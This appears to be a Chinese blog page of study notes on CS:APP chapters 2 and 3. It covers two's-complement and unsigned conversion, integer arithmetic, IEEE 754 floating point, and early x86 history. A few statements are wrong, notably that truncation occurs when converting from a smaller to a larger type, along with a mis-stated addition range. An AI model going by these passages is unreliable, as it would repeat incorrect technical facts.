<li>当$x&lt;0$时，$T2U_{w}(x)=x+2^{w}$；</li>
<li>当$x\ge 0$时，$T2U_{w}(x)=x$；</li>
</ul>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/T2U.png" alt="T2U"></p>
<p>实际上就是相差了两个符号位。负数转换成了大的正数，非负数保持不变。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E4%B8%A4%E4%B8%AA%E7%AC%A6%E5%8F%B7%E4%BD%8D.png" alt="两个符号位"></p>
</li>
<li><p>数值是如何改变的（无符号数到有符号数，u满足0\le u\le Umax_{w}）$：</p>
<ul>
<li>当$u\le TMax_{w}$时，$U2T_{w}(u)=u$；</li>
<li>当$u&gt;TMax_{w}$时，$U2T_{w}(u)=u-2^{w}$；</li>
</ul>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/U2T.png" alt="U2T"></p>
</li>
<li><p>在$0\le x\le TMax_{w}$之内的x有相同的无符号和有符号（补码）表示，范围之外的需要加上或减去$2^{w}$。</p>
</li>
<li><p>最靠近0的负数（-1）映射为最大的无符号数，最小的负数（TMin_{w}）映射为一个刚好在补码的正数范围之外的无符号数。</p>
</li>
</ol>
<h3 id="2-2-5-Signed-versus-Unsigned-in-C"><a href="#2-2-5-Signed-versus-Unsigned-in-C" class="headerlink" title="2.2.5 Signed versus Unsigned in C"></a>2.2.5 Signed versus Unsigned in C</h3><p>C语言中的有符号数与无符号数。</p>
<ol>
<li><p>C语言中大多数数字默认为有符号，若要创建一个无符号常量，需要加上后缀字符<code>&#39;U&#39;</code>或者<code>&#39;u&#39;</code>。</p>
</li>
<li><p>C语言中可以显式或隐式转换有符号数和无符号数，用<code>printf</code>函数的<code>%u</code>可以打印<code>unsigned</code>即无符号数，<code>%d</code>打印<code>int</code>即有符号数。（CS:APP3e中文版52页、English version Page 111处有误）</p>
</li>
<li><p>C语言中执行运算时，如果它的一个运算数是有符号的而另一个是无符号的，那么C会隐式地<strong>将有符号数强制类型转换为无符号数</strong>，并假设这两个数都是非负的来执行这个运算：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E9%9A%90%E5%BC%8F%E8%BD%AC%E6%8D%A2.png" alt="隐式转换"></p>
<p><code>*</code>：发生类型转换。</p>
<p>无符号数不要和-1比。</p>
</li>
<li><p>上图中将$TMin_{32}$写成<code>-2147483647-1</code>，没有写成<code>-2147483648</code>或<code>0x80000000</code>。在C头文件<code>limits.h</code>中发现使用了类似的写法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Minimum and maximum values a tsigned int&#x27; can hold. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INT_MAX 2147483647</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INT_MIN (-INT_MAX - 1)</span></span><br></pre></td></tr></table></figure>
<p>是由于补码表示的不对称性和C语言的转换规则之间奇怪的交互，迫使我们用这种不寻常的方式。</p>
</li>
</ol>
<h3 id="2-2-6-Expanding-the-Bit-Representation-of-a-Number"><a href="#2-2-6-Expanding-the-Bit-Representation-of-a-Number" class="headerlink" title="2.2.6 Expanding the Bit Representation of a Number"></a>2.2.6 Expanding the Bit Representation of a Number</h3><p>扩展一个数字的位表示。</p>
<ol>
<li>在不同字长的整数之间进行运算，保持数值不变的前提下，可以从一个较小的数据类型转换到一个较大的数据类型，但反过来是不可能的。</li>
<li>将一个无符号数转换为一个更大的数据类型，只要简单地在表示的开头添加0。这种运算被称为<strong>零扩展（zero extension）</strong>，直接遵循了无符号数编码的定义。</li>
<li>将一个有符号数（补码数字）转换为一个更大的数据类型，要执行<strong>符号扩展（sign extension）</strong>，在表示的开头添加最高有效位的值。因为都是2的幂次，2倍抵消一半后与原来相同。（理解了算术右移）</li>
<li>C语言标准要求，<code>short</code>转换到<code>unsigned</code>时，先改变大小，再从有符号转换到无符号。即<code>(unsigned)sx</code>等价于<code>(unsigned)(int)sx</code>，而不是<code>(unsigned)(unsigned short)sx</code>。</li>
</ol>
<h3 id="2-2-7-Truncating-Numbers"><a href="#2-2-7-Truncating-Numbers" class="headerlink" title="2.2.7 Truncating Numbers"></a>2.2.7 Truncating Numbers</h3><p>截断数字。</p>
<ol>
<li>当从一个较小的数据类型转换到一个较大的数据类型时，会发生数字的截断，即丢弃最高若干位。</li>
<li>截断一个数字可能会改变它的值，这就是溢出的一种形式。</li>
<li>假设w位无符号数被截断为k位，结果为原数对$2^{k}$取模。</li>
<li>假设w位有符号数（补码数值）被截断为k位，结果为原数对$2^{k}$取模后再转换为补码。</li>
</ol>
<h3 id="2-2-8-Advice-on-Signed-versus-Unsigned"><a href="#2-2-8-Advice-on-Signed-versus-Unsigned" class="headerlink" title="2.2.8 Advice on Signed versus Unsigned"></a>2.2.8 Advice on Signed versus Unsigned</h3><p>关于有符号数与无符号数的建议：</p>
<p>无符号运算的细微特性，尤其是有符号数到无符号数的隐式转换，会导致错误或出现漏洞。避免这类错误的一种方法就是绝不使用无符号数，除C以外很少有语言支持无符号整数，这些语言的设计者认为无符号数带来的麻烦要比益处多得多。</p>
<p>当我们想要把字仅仅看作是位的集合而没有任何数字意义时，无符号数值又是非常有用的。如往一个字中放入描述各种布尔条件的标记（flag）时、表示地址时、实现模运算和多精度运算的数学包时（数字是由字的数组来表示的）等。</p>
<h2 id="2-3-Integer-Arithmetic"><a href="#2-3-Integer-Arithmetic" class="headerlink" title="2.3 Integer Arithmetic"></a>2.3 Integer Arithmetic</h2><p>整数运算。</p>
<p>计算机运算具有有限性，理解计算机运算的细微之处能够帮助程序员编写更可靠的代码。</p>
<h3 id="2-3-1-Unsigned-Addition"><a href="#2-3-1-Unsigned-Addition" class="headerlink" title="2.3.1 Unsigned Addition"></a>2.3.1 Unsigned Addition</h3><p>无符号加法。</p>
<ol>
<li><p>下图展示了当两个4位无符号数进行加法运算时，和的坐标图：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%97%A0%E7%AC%A6%E5%8F%B7%E5%8A%A0%E6%B3%95.png" alt="无符号加法"></p>
<p>对于一个4位的字长（0～15），其和可能需要5位（0～30）。</p>
</li>
<li><p>上面的例子意味着，要想完整地表示算术运算的结果，我们不能对字长做任何限制。一些编程语言，如Lisp，实际上就支持无限精度的运算，允许任意的（在机器的内存限制之内）整数运算。更常见的是编程语言支持固定精度的运算，因此像加法和乘法这样的运算不同于它们在整数上的相应运算。</p>
</li>
<li><p>无符号加法：对<code>w</code>位的<code>x</code>和<code>y</code>，若<code>x+y</code>仍为<code>w</code>位，则无符号加法结果就是<code>x+y</code>；若<code>x+y</code>超过<code>w</code>位（溢出），即为<code>w+1</code>位，则无符号加法结果就是$x+y-2^{w}$。</p>
<p>总之，位级表示结果就是舍弃溢出位，算术表示结果就是$(x+y) mod 2^{w}$。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E8%88%8D%E5%BC%83%E6%BA%A2%E5%87%BA%E4%BD%8D.png" alt="舍弃溢出位"></p>
</li>
<li><p>回到一开始的例子，真正的无符号加法可以表示为下图：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%97%A0%E7%AC%A6%E5%8F%B7%E6%BA%A2%E5%87%BA.png" alt="无符号溢出"></p>
</li>
<li><p>当结果比x或y小时，可以判定发生了溢出。</p>
</li>
<li><p>模数加法形成了一种数学结构，称为<strong>阿贝尔群（Abelian group）</strong>，以丹麦数学家Niels Henrik Abel（1802～1829）的名字命名。它是可交换的（abelian）且可结合的。它有一个单位元0，且每个元素有一个加法逆元（加法的逆操作即求反）。</p>
</li>
<li><p>无符号数的加法逆元：<code>w</code>位的无符号数<code>x</code>，其<code>w</code>位的无符号逆元为：当<code>x=0</code>时，为<code>x</code>；当<code>x&gt;0</code>时，为$2^{w}-x$。</p>
<p>“$2^{w}=0$”</p>
</li>
</ol>
<h3 id="2-3-2-Two’s-Complement-Addition"><a href="#2-3-2-Two’s-Complement-Addition" class="headerlink" title="2.3.2 Two’s-Complement Addition"></a>2.3.2 Two’s-Complement Addition</h3><p>有符号加法——补码加法。</p>
<ol>
<li><p>由于补码存在下限和上限，所以应该确定当结果太大或者太小时应该做些什么。</p>
</li>
<li><p>补码加法：对满足$-2^{w-1}\le x,y\le 2^{w-1}-1$的<code>x</code>和<code>y</code>，若<code>x+y</code>仍满足$-2^{w-1}\le x+y&lt;2^{w-1}-1$，则补码加法结果就是<code>x+y</code>；若$2^{w-1}\le x+y$（正溢出），则补码加法结果就是$x+y-2^{w}$；若$x+y&lt;-2^{w-1}$（负溢出），则补码加法结果就是$x+y+2^{w}$。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E8%A1%A5%E7%A0%81%E5%8A%A0%E6%B3%95.png" alt="补码加法"></p>
<p>总之，结果的位级表示与无符号加法完全相同。实际上，大多数计算机对二者使用同样的机器指令。</p>
</li>
<li><p>字长为4的补码加法可以表示为：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%AD%A3%E8%B4%9F%E6%BA%A2%E5%87%BA.png" alt="正负溢出"></p>
</li>
<li><p>当x和y同号，但结果与之异号时，可以判定发生了正/负溢出。</p>
</li>
<li><p>同样，补码加法也形成了阿贝尔群。如<code>(x+y)-x==y</code>恒成立。</p>
</li>
<li><p>注意<code>-TMin=TMin</code>，在函数的任何测试过程中，<code>TMin</code>都应该作为一种测试情况。</p>
</li>
</ol>
<h3 id="2-3-3-Two’s-Complement-Negation"><a href="#2-3-3-Two’s-Complement-Negation" class="headerlink" title="2.3.3 Two’s-Complement Negation"></a>2.3.3 Two’s-Complement Negation</h3><ol>
<li><p>补码的加法逆元：<code>TMin</code>的加法逆元就是它本身；大于<code>TMin</code>的<code>x</code>的加法逆元就是<code>-x</code>。</p>
<p>“$-2^{w}=0$”</p>
</li>
<li><p>求位级补码的加法逆元的第一种方法就是对每一位取反，再对结果加1（“取反加一”）。在C语言中，对于任意整数<code>x</code>，<code>-x</code>和<code>~x+1</code>的结果完全相同。</p>
</li>
<li><p>求位级补码的加法逆元的第二种方法就是将位向量分为两部分，找到最右边的1的位置（设为k）：$[x_{w-1}, x_{w-2}, …, x_{k+1}, 1, 0, …, 0]$，它的加法逆元就是$[~x_{w-1}, ~x_{w-2}, …, ~x_{k+1}, 1, 0, …, 0]$，即对位k左边的所有位取反。（证明方法参见<a href="https://www.superpung.xyz/Data-Lab-1/">Data Lab #1</a>）</p>
</li>
</ol>
<h3 id="2-3-4-Unsigned-Multiplication"><a href="#2-3-4-Unsigned-Multiplication" class="headerlink" title="2.3.4 Unsigned Multiplication"></a>2.3.4 Unsigned Multiplication</h3><p>w位无符号乘法，位级表示仍为截断高位，算术表示仍为对$2^{w}$取模的结果。</p>
<h3 id="2-3-5-Two’s-Complement-Multiplication"><a href="#2-3-5-Two’s-Complement-Multiplication" class="headerlink" title="2.3.5 Two’s-Complement Multiplication"></a>2.3.5 Two’s-Complement Multiplication</h3><p>补码乘法与无符号乘法的结果具有位级等价性，位级表示为截断高位，算术表示为对$2^{w}$取模的结果的补码形式。</p>
<h3 id="2-3-6-Multiplying-by-Constants"><a href="#2-3-6-Multiplying-by-Constants" class="headerlink" title="2.3.6 Multiplying by Constants"></a>2.3.6 Multiplying by Constants</h3><p>乘以常数。</p>
<ol>
<li><p>以往在大多数机器上，乘法指令相当慢，需要10个或更多的时钟周期，然而其他整数运算（例如加法、减法、位级运算和移位）只需要1个时钟周期。</p>
<p>因此，编译器使用了一项重要的优化，试着用移位和加法运算的组合来代替乘以常数因子的乘法。</p>
</li>
<li><p>乘以2的k次幂等价于将其左移k位，溢出则截断。</p>
</li>
<li><p>将乘数分成[(0…0)(1…1)(0…0)…(1…1)]，对应位置采用移位运算。</p>
</li>
</ol>
<h3 id="2-3-7-Dividing-by-Powers-of-2"><a href="#2-3-7-Dividing-by-Powers-of-2" class="headerlink" title="2.3.7 Dividing by Powers of 2"></a>2.3.7 Dividing by Powers of 2</h3><p>除以2的幂。</p>
<ol>
<li>在大多数机器上，整数除法要比整数乘法更慢——需要30个或者更多的时钟周期。</li>
<li>除以2的幂使用右移来实现，无符号使用逻辑移位，有符号（补码）使用算术移位。</li>
<li>整数除法总是<strong>舍入到零</strong>（舍弃小数）。</li>
<li>无符号除以2的幂：右移相应位，向下舍入（向零舍入）。由于一定是逻辑右移，所以非常简单。</li>
<li>有符号（补码）除以2的幂：默认为向下舍入，为了向零舍入，需要在移位之前<strong>偏置（biasing）</strong>这个值，如将x除以2的k次幂，可以表示成<code>(x+(1&lt;&lt;k)-1)&gt;&gt;k</code>（算术右移）。（CS:APP3e中文版73页处有误，抄都能抄错）</li>
<li>偏置技术利用了：<code>x/y</code>向上舍入等价于<code>(x+y-1)/y</code>向下舍入（y&gt;0）。</li>
<li>可以看到，除以2的幂可以由逻辑或者算术右移来实现。不幸的是，这种方法不能推广到任意常数，这与乘法不同。</li>
</ol>
<h3 id="2-3-8-Final-Thoughts-on-Integer-Arithmetic"><a href="#2-3-8-Final-Thoughts-on-Integer-Arithmetic" class="headerlink" title="2.3.8 Final Thoughts on Integer Arithmetic"></a>2.3.8 Final Thoughts on Integer Arithmetic</h3><p>关于整数运算的最后思考：由于表示数字的字长有限，计算机执行的整数运算实际上是一种模运算形式。</p>
<h2 id="2-4-Floating-Point"><a href="#2-4-Floating-Point" class="headerlink" title="2.4 Floating Point"></a>2.4 Floating Point</h2><ol>
<li>浮点表示对<strong>形如</strong>$V=x\times 2^{y}$<strong>的有理数</strong>进行编码。它对于执行涉及非常大的数字（$|V|\gg 0$）、非常接近于0（$|V|\ll 1$）的数字，以及更普遍地作为实数运算的近似值的计算，是很有用的。</li>
<li>电气和电子工程师协会（IEEE）是一个包括所有电子和计算机技术的专业团体。它出版刊物，举办会议，并且建立委员会来定义标准，内容涉及从电力传输到软件工程。它创立了IEEE 754浮点标准。另一个IEEE标准的例子是无线网络的802.11标准。</li>
<li>我们将看到IEEE浮点格式的数字表示并探讨舍入（rounding）问题。</li>
</ol>
<h3 id="2-4-1-Fractional-Binary-Numbers"><a href="#2-4-1-Fractional-Binary-Numbers" class="headerlink" title="2.4.1 Fractional Binary Numbers"></a>2.4.1 Fractional Binary Numbers</h3><p>二进制小数——理解浮点数的第一步。</p>
<ol>
<li>二进制小数中小数点右侧的位的权是2的负幂。</li>
<li>当我们仅考虑有限长度的编码，小数的二进制表示法只能表示那些能够被写成$x\times 2^{y}$的数，其他的值只能够被近似地表示。增加二进制表示的长度可以提高表示的精度。</li>
</ol>
<h3 id="2-4-2-IEEE-Floating-Point-Representation"><a href="#2-4-2-IEEE-Floating-Point-Representation" class="headerlink" title="2.4.2 IEEE Floating-Point Representation"></a>2.4.2 IEEE Floating-Point Representation</h3><p>IEEE浮点表示。</p>
<ol>
<li><p>上面提到的是定点表示法，不能有效地表示非常大的数字。相反，我们希望通过给定x和y的值，来表示形如$x\times 2^{y}$的数。即二进制不再是普通的二进制数。</p>
</li>
<li><p>IEEE浮点标准用$V=(-1)^{s}\times M\times 2^{E}$的形式来表示一个数（即先将数字转换成<strong>二进制小数</strong>）：</p>
<ul>
<li><strong>符号（sign）</strong>：<code>s</code>决定这个数是负数（<code>s=1</code>）还是正数（<code>s=0</code>），数值0为特殊情况。</li>
<li><strong>尾数（significand）</strong>：<code>M</code>是一个二进制小数，范围是1～2-𝜺，或者是0～1-𝜺。</li>
<li><strong>阶码（exponent）</strong>：<code>E</code>的作用是对浮点数加权，权重是2的E次幂（可能是负数）。</li>
</ul>
</li>
<li><p>将浮点数的位表示划分为三个字段，分别对这些值进行编码：</p>
<ul>
<li>一个单独的符号位<code>s</code>直接编码符号<code>s</code>。</li>
<li><code>k</code>位的阶码字段$exp=e_{k-1}…e_{1}e_{0}$编码阶码E。</li>
<li><code>n</code>位小数字段$frac=f_{n-1}…f_{1}f_{0}$编码尾数M，但是编码出来的值也依赖于阶码字段的值是否等于0。</li>
</ul>
<p>如下图所示：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%B5%AE%E7%82%B9%E8%A1%A8%E7%A4%BA.png" alt="浮点表示"></p>
<ul>
<li>在单精度浮点格式（C语言的<code>float</code>）中，<code>s</code>、<code>exp</code>和<code>frac</code>字段分别为1位、8位和23位，得到一个32位的表示；</li>
<li>在双精度浮点格式（C语言的<code>double</code>）中，<code>s</code>、<code>exp</code>和<code>frac</code>字段分别为1位、11位和52位，得到一个64位的表示。</li>
</ul>
</li>
<li><p>给定了位的表示，根据<code>exp</code>的值，被编码的值可以分成三种不同的情况（以单精度为例）：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%8D%95%E7%B2%BE%E5%BA%A6%E4%B8%89%E6%83%85%E5%86%B5.png" alt="单精度三情况"></p>
<ol>
<li><p><strong>规格化的值（normalized）</strong></p>
<p>这是最普遍的情况，此时<code>exp</code>不为全0（0）且不为全1（单精度255，双精度2047）。</p>
<p>这种情况中：</p>
<ul>
<li><p><code>exp</code>被解释为以<strong>偏置（biased）</strong>形式表示的<strong>有符号整数</strong>。即**阶码的值<code>E=e-Bias</code>**，其中<code>e</code>是无符号数，位表示为$e_{k-1}…e_{1}e_{0}$；<code>Bias</code>是一个等于$2^{k-1}-1$（单精度127，双精度1023）的偏置值。由此产生的指数的取值范围是，单精度-126～+127，双精度-1022～+1023。</p>
</li>
<li><p><code>frac</code>被解释为描述小数值<code>f</code>，其中$0\le f&lt;1$，二进制表示为$0.f_{n-1}…f_{1}f_{0}$，即二进制小数点在最高有效位的左边。**尾数<code>M=1+f</code>**，也称为隐含的以1开头（implied leading 1）表示，所以不用显式表示它。因为我们可以调整阶码E，使尾数M在$1\le M&lt;2$之中（假设没有溢出），这种表示方法可以轻松获得一个额外精度位。</p>
</li>
</ul>
</li>
<li><p><strong>非规格化的值（denormalized）</strong></p>
<p>此时<code>exp</code>为全0。</p>
<p>这种情况中：</p>
<ul>
<li>**阶码值<code>E=1-Bias</code>**。虽然这比<code>E=-Bias</code>反直觉，但这种定义方式提供了一种从非规格化值平滑转换到规格化值的方法。</li>
<li>**尾数<code>M=f</code>**，即小数字段，不包含隐含的开头的1。</li>
</ul>
<p>非规格化数有两个用途：</p>
<ul>
<li>提供了一种表示数值0的方法。因为规格化数中$M\ge 1$，不能表示0。符号位为0，其他域也全为0时，得到+0.0；符号位为1，其他域全为0时，得到-0.0。</li>
<li>表示那些非常接近于0.0的数。它们提供了一种属性，称为<strong>逐渐溢出（gradual underflow）</strong>，其中可能的数值分布均匀地接近于0.0。</li>
</ul>
</li>
<li><p><strong>特殊值（infinity&amp;NaN）</strong></p>
<p>此时<code>exp</code>为全1。</p>
<p>这种情况中：</p>
<ul>
<li>当小数域全为0时，得到无穷。当<code>s=0</code>时是+∞，当<code>s=1</code>时是-∞。当我们把两个非常大的数相乘，或者除以零时，无穷能够表示溢出的结果。</li>
<li>当小数域为非零时，结果值称为“NaN”，即“不是一个数（Not a Number）”。一些运算的结果不是实数或无穷时就会得到这样的NaN值，比如计算$\sqrt{-1}$或∞-∞时。在某些应用中，表示未初始化的数据时，它们也很有用处。</li>
</ul>
</li>
</ol>
</li>
</ol>
<h3 id="2-4-3-Example-Numbers"><a href="#2-4-3-Example-Numbers" class="headerlink" title="2.4.3 Example Numbers"></a>2.4.3 Example Numbers</h3><p>数字示例。</p>
<ol>
<li><p>将浮点数表示在数轴上（6位格式表示）：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%B5%AE%E7%82%B9%E6%95%B0%E5%9C%A8%E6%95%B0%E8%BD%B4.png" alt="浮点数在数轴"></p>
<p>可以发现：</p>
<ul>
<li>两个无穷值在两个末端，非规格化数聚集在0的附近。</li>
<li>+0和-0是两个特殊的非规格化数。</li>
<li>可表示的数<strong>不是均匀分布的</strong>，越靠近原点处它们越稠密。</li>
</ul>
</li>
<li><p>下面是8位浮点格式的示例：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/8%E4%BD%8D%E6%B5%AE%E7%82%B9.png" alt="8位浮点"></p>
<p>可以观察到最大非规格化数到最小规格化数的平滑转变，这种平滑性归功于我们将非规格化数的<code>E</code>定义为<code>1-Bias</code>而不是<code>-Bias</code>，我们可以补偿非规格化数的尾数没有隐含的开头的1。</p>
<p>而且可以观察到，位表达式是按升序排列的，表示的浮点数也是按升序排列的。这不是偶然的——IEEE格式如此设计就是为了浮点数能够<strong>使用整数排序函数</strong>来进行排序。</p>
<p>当处理负数时，由于开头的1，并且是按降序排列的，但是不需要浮点运算来进行比较也能解决这个问题。</p>
</li>
<li><p>下面是一些重要的单精度和双精度浮点数的表示和数字值：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%8D%95%E5%8F%8C%E7%B2%BE%E5%BA%A6%E9%87%8D%E8%A6%81%E5%80%BC.png" alt="单双精度重要值"></p>
</li>
</ol>
<h3 id="2-4-4-Rounding"><a href="#2-4-4-Rounding" class="headerlink" title="2.4.4 Rounding"></a>2.4.4 Rounding</h3><ol>
<li>舍入就是用一种系统的方法找到实数“最接近的”浮点表示，关键是在两个可能值的正中间确定舍入方向。</li>
<li>舍入的方式有向偶数舍入（round-to-even，也称向最接近的值舍入，round-to-nearest，是默认的方式，当数值在正中间时，使得舍入结果的最低有效数字是偶数）、向零舍入、向下舍入和向上舍入。</li>
<li>除了向偶数舍入，其他三种方式产生实际值的确界（guaranteed bound），在一些数字应用中是很有用的：<ul>
<li>向零舍入得到的值的绝对值不超过原数；</li>
<li>向下舍入得到的值不超过原数；</li>
<li>向上舍入得到的值不小于原数。</li>
</ul>
</li>
<li>向偶数舍入在大多数情况下避免了统计偏差，使得结果不偏高也不偏低。</li>
</ol>
<h3 id="2-4-5-Floating-Point-Operations"><a href="#2-4-5-Floating-Point-Operations" class="headerlink" title="2.4.5 Floating-Point Operations"></a>2.4.5 Floating-Point Operations</h3><p>浮点运算。</p>
<ol>
<li>浮点运算的结果是实际运算舍入后的结果，实数上的加法也形成了阿贝尔群（但需要考虑舍入的影响）。</li>
<li>浮点加法是可交换的，除了无穷和<code>NaN</code>外的大多数值都存在加法逆元（<code>+∞-∞=NaN</code>，<code>NaN</code>加任何数都等于<code>NaN</code>）。</li>
<li>由于舍入的丢失，浮点加法是<strong>不可结合</strong>的，这是缺少的最重要的群属性。</li>
<li>浮点加法满足单调性属性，即当$x\ne NaN$时，$a\ge b$能推出$x+a\ge x+b$。无符号和补码加法不具有此属性。</li>
<li>浮点乘法是封闭的（虽然可能产生无穷大或<code>NaN</code>），是可交换的，乘法单位元是1.0。由于溢出或舍入而丢失精度的可能，浮点乘法不可结合、不可分配。</li>
<li>浮点乘法同样满足单调性属性。无符号和补码乘法同样不具有此属性。</li>
<li>浮点数的平方始终非负（即使可能溢出到+∞）。</li>
</ol>
<h3 id="2-4-6-Floating-Point-in-C"><a href="#2-4-6-Floating-Point-in-C" class="headerlink" title="2.4.6 Floating Point in C"></a>2.4.6 Floating Point in C</h3><p>C语言中的浮点数。</p>
<ol>
<li><p>在支持IEEE浮点格式的机器上，C中<code>float</code>对应单精度浮点数，<code>double</code>对应双精度浮点数。使用向偶数舍入的方式。</p>
</li>
<li><p>当程序文件中有</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>时，GNU编译器GCC会定义常数<code>INFINITY</code>表示+∞，<code>NaN</code>表示$NaN$。</p>
</li>
<li><p>当在<code>int</code>、<code>float</code>和<code>double</code>格式之间进行强制类型转换时，程序改变数值和位模式的原则如下：</p>
<ul>
<li>从<code>int</code>到<code>float</code>，不会溢出，可能舍入；</li>
<li>从<code>int</code>或<code>float</code>到<code>double</code>，保留精确数值；</li>
<li>从<code>double</code>到<code>float</code>，可能溢出，可能舍入；</li>
<li>从<code>float</code>或<code>double</code>到<code>int</code>，可能溢出为不确定值，向零舍入。</li>
</ul>
</li>
<li><p><code>x == (int)(double)x</code>为假，例如当<code>x</code>为<code>TMax</code>时；<code>f == -(-f)</code>为真，因为浮点数的相反数就是简单地对其符号位取反；<code>(f+d)-f == d</code>为假，因为可能发生舍入。</p>
</li>
</ol>
<h2 id="2-5-Summary"><a href="#2-5-Summary" class="headerlink" title="2.5 Summary"></a>2.5 Summary</h2><p>计算机将信息编码为<strong>位（比特）</strong>，通常组织成<strong>字节序列</strong>。有<strong>不同的编码方式</strong>用来表示整数、实数和字符串。</p>
<p>不同的计算机模型在编码数字和多字节数据中的<strong>字节顺序</strong>时使用不同的约定。</p>
<p>大多数机器对整数使用<strong>补码</strong>编码，而对浮点数使用<strong>IEEE标准754</strong>编码。</p>
<p>在相同长度的无符号和有符号整数之间进行强制类型转换时，大多数C语言实现遵循的原则是<strong>底层的位模式不变</strong>。在补码机器上，对于一个<code>w</code>位的值，这种行为是由函数$T2U_{w}$和$U2T_{w}$来描述的。</p>
<p>由于<strong>编码的长度有限</strong>，与传统整数和实数运算相比，计算机运算具有非常不同的属性。当超出表示范围时，有限长度能够引起数值<strong>溢出</strong>。当浮点数非常接近于0.0，从而转换成零时，也会下溢。</p>
<p>和大多数其他程序语言一样，C语言实现的有限整数运算和真实的整数运算相比，有一些特殊的属性。例如，由于溢出，表达式<code>x*x</code> 能够得出负数。</p>
<p>浮点表示通过将数字编码为$x\times 2^{y}$的形式来<strong>近似</strong>地表示实数。最常见的浮点表示方式是由IEEE标准754定义的。它提供了几种不同的精度，最常见的是单精度（32位）和双精度（64位）。</p>
<p>必须非常小心地使用浮点运算，因为浮点运算只有<strong>有限的范围和精度</strong>，而且并<strong>不遵守</strong>普遍的算术属性，比如结合性。</p>
<h1 id="Chapter-3-Machine-Level-Representation-of-Programs"><a href="#Chapter-3-Machine-Level-Representation-of-Programs" class="headerlink" title="Chapter 3: Machine-Level Representation of Programs"></a>Chapter 3: Machine-Level Representation of Programs</h1><blockquote>
<p>第3章：程序的机器级表示。我们教读者如何阅读由C编译器生成的x86-64机器代码。</p>
<p>我们说明为不同控制结构（比如条件、循环和开关语句）生成的基本指令模式。我们还讲述过程的实现，包括栈分配、寄存器使用惯例和参数传递。我们讨论不同数据结构（如结构、 联合和数组）的分配和访问方式。我们还说明实现整数和浮点数算术运算的指令。我们还以分析程序在机器级的样子作为途径，来理解常见的代码安全漏洞（例如缓冲区溢出），以及理解程序员、编译器和操作系统可以采取的减轻这些威胁的措施。学习本章的概念能够帮助读者成为更好的程序员，因为你们懂得程序在机器上是如何表示的。另外一个好处就在于读者会对指针有非常全面而具体的理解。</p>
</blockquote>
<ol>
<li>计算机执行的是<strong>机器代码</strong>，用<strong>字节序列</strong>编码低级的操作，包括处理数据、管理内存、读写存储设备上的数据，以及利用网络通信。</li>
<li>机器代码是如何得到的？是<strong>编译器</strong>基于编程语言的规则、目标机器的指令集和操作系统遵循的惯例，经过一系列的阶段生成的。</li>
<li>GCC C语言编译器以<strong>汇编代码</strong>的形式产生输出，汇编代码是<strong>机器代码的文本表示</strong>，给出程序中的每一条指令。然后GCC调用<strong>汇编器</strong>和<strong>链接器</strong>，根据汇编代码生成机器代码。</li>
<li>高级语言屏蔽了程序的细节——机器级的实现，提供了较高的抽象级别，使得工作效率和可靠性提高。最大的优点是其可移植性，而汇编代码是与特定机器密切相关的。</li>
<li>我们通过分析汇编代码，可以理解编译器的优化能力，并分析代码中隐含的低效率，还可以了解程序运行时的行为，防御可能出现的漏洞。</li>
<li>我们将了解典型的编译器在将C程序结构变换成机器代码时所做的转换，相对于C代码表示的计算操作，优化编译器能够重新排列执行顺序，消除不必要的计算，用快速操作替换慢速操作，甚至将递归计算变换成迭代计算。</li>
<li>这是一种<strong>逆向工程（reverse engineering）</strong>——通过研究系统和逆向工作，来试图了解系统（即汇编语言程序）的创建过程。</li>
<li>我们的描述基于x86-64。IA32是x86-64的32位前身，而x86-64也可以向后兼容执行IA32程序。</li>
</ol>
<h2 id="3-1-A-Historical-Perspective"><a href="#3-1-A-Historical-Perspective" class="headerlink" title="3.1 A Historical Perspective"></a>3.1 A Historical Perspective</h2><p>历史观点。</p>
<ol>
<li><p>Inter处理器系列俗称x86，经历了长期的、不断进化的发展。以下列举了一些Inter处理器的模型，以及它们的一些关键特性，特别是影响机器级编程的特性。用其所需的晶体管数量来说明演变过程的复杂性，K表示1 000，M表示1 000 000，G表示1 000 000 000。</p>
<ul>
<li><strong>8086</strong>（1978年，29K个晶体管）。第一代单芯片、16位处理器之一。只有655 360字节的地址空间——地址只有20位长（可寻址范围为1 048 576字节），而操作系统保留了393 216字节自用。</li>
<li><strong>80286</strong>（1982年，134K个晶体管）。增加了更多的寻址模式（现在已废弃），构成了IBM PC-AT个人计算机的基础，是MS Windows最初的使用平台。</li>
<li><strong>i386</strong>（1985年，275K个晶体管）。将体系结构扩展到32位。增加了平坦寻址模式（flat addressing model），Linux和最新版本的Windows都是使用的这种模式。这是Inter系列中第一台全面支持Unix操作系统的机器。</li>
<li><strong>i486</strong>（1989年，1.2M个晶体管）。改善了性能，同时将浮点单元集成到了处理器芯片上，但是指令集没有明显改变。</li>
<li><strong>Pentium</strong>（1993年，3.1M个晶体管）。改善了性能，不过只对指令集进行了小的扩展。</li>
<li><strong>PentiumPro</strong>（1995年，5.5M个晶体管）。引入全新的处理器设计，在内部被称为P6微体系结构。指令集中增加了一类“条件传送（conditional move）”指令。</li>
<li><strong>Pentium/MMX</strong>（1997年，4.5M个晶体管）。在Pentium处理器中增加了一类新的处理整数向量的指令。每个数据大小可以是1、2或4字节。每个向量总长64位。</li>
<li><strong>Pentium II</strong>（1997年，7M个晶体管）。P6微体系结构的延伸。</li>
